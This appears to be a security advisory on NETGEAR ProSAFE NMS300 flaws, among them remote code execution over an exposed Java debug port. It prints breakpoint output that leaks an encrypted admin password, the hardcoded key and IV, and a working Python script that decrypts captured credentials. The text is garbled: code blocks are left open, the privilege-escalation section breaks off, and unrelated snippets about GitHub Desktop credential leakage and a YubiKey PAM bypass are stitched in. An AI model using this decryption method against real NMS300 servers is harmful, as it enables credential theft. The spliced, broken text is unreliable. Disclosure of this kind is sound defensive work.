# NETGEAR ProSAFE Network Management System (NMS300) Multiple Vulnerabilities

Critical

[← View More Research Advisories](/security/research)
### Synopsis

Tenable has found multiple vulnerabilities in NETGER ProSAFE Network Management System (NMS300) v1.7.0.26.

### Java Debug Wire Protocol (JDWP) RCE (CVE-2023-49693)

NSM300 has JDWP enabled on port 11611 and it's remotely accessible:

```
PS C:\Program Files\NMS300> Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\WOW6432Node\Apache Software Foundation\Procrun 2.0\NMS300_Server\Parameters\Java\' -Name Options
-Dcatalina.base=C:\Program Files\NMS300\NMS300\apache-tomcat-6.0.33
-Dcatalina.home=C:\Program Files\NMS300\NMS300\apache-tomcat-6.0.33
-Djava.endorsed.dirs=C:\Program Files\NMS300\NMS300\apache-tomcat-6.0.33\endorsed
-Xdebug
-Xrunjdwp:transport=dt_socket,address=11611,server=y,suspend=n
-Djava.io.tmpdir=C:\Program Files\NMS300\NMS300\apache-tomcat-6.0.33\temp
-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
-Djava.util.logging.config.file=C:\Program Files\NMS300\NMS300\apache-tomcat-6.0.33\conf\logging.properties
```

A metasploit module (exploit/multi/misc/java\_jdwp\_debugger) exists to exploit the JDWP RCE.

In addition, an unauthenticated remote attacker can attach to the NMS300 server (via JDWP) to intercept user login requests to grab user credentials. For example, the attacker can break into com.elite.wifi.manager.dbservice.user.UserService.userLogin() and then com.elite.wifi.manager.utils.AESSaltEncryptUtil.decrypt() to learn about the admin password:

```
Breakpoint hit: "thread=http-8080-3", com.elite.wifi.manager.utils.AESSaltEncryptUtil.decrypt(), line=59 bci=0
Method arguments:
encry = "lxUCViqkXpl4/wZXIyKjxQ=="
password = "NMS300_Server_Secret"

The encrypted password can then be decrypted with the following python script:

```
import sys, base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA1
data = base64.b64decode(sys.argv[1])
salt= base64.b64decode(sys.argv[2])
pw = 'NMS300_Server_Secret'
if len(sys.argv) == 4: pw = sys.argv[3]
key = PBKDF2(pw.encode(), salt, 32, 1000, None, SHA1)
iv = 'NMS300_Server_IV'.encode()
cipher = AES.new(key, AES.MODE_CBC, iv=iv)
print('\n' + cipher.decrypt(data).decode())
```

Usage:

```
python3 nms300_decrypt.py <base64_encoded_encrypted_data> <base64_encoded_salt>

### Privilege Escalation Via MySQL Server (CVE-2023-49694)

A low-privileged OS user with access to a Windows host where NMS300 is installed can create arbitrary JSP files in a Tomcat web application directory. The user can then execute the JSP files under the security context of SYSTEM.

  ###### medium

  GitHub Desktop is an open-source Electron-based GitHub app designed for git development. An attacker convincing a user to clone a repository directly or through a submodule can allow the attacker access to the user's credentials through the use of maliciously crafted remote URL. GitHub Desktop relies on Git to perform all network related operations (such as cloning, fetching, and pushing). When a user attempts to clone a repository GitHub Desktop will invoke `git clone` and when Git encounters a remote which requires authentication it will request the credentials for that remote host from GitHub Desktop using the git-credential protocol. Using a maliciously crafted URL it's possible to cause the credential request coming from Git to be misinterpreted by Github Desktop such that it will send credentials for a different host than the host that Git is currently communicating with thereby allowing for secret exfiltration. GitHub username and OAuth token, or credentials for other Git remote hosts stored in GitHub Desktop could be improperly transmitted to an unrelated host. Users should update to GitHub Desktop 3.4.12 or greater which fixes this vulnerability. Users who suspect they may be affected should revoke any relevant credentials.

This product implements a Pluggable Authentication Module (PAM) that can be deployed to support authentication using a YubiKey or other FIDO compliant authenticators on macOS or Linux. This software package has an issue that allows for an authentication bypass in some configurations. An attacker would require the ability to access the system as an unprivileged user. Depending on the configuration, the attacker may also need to know the user's password.
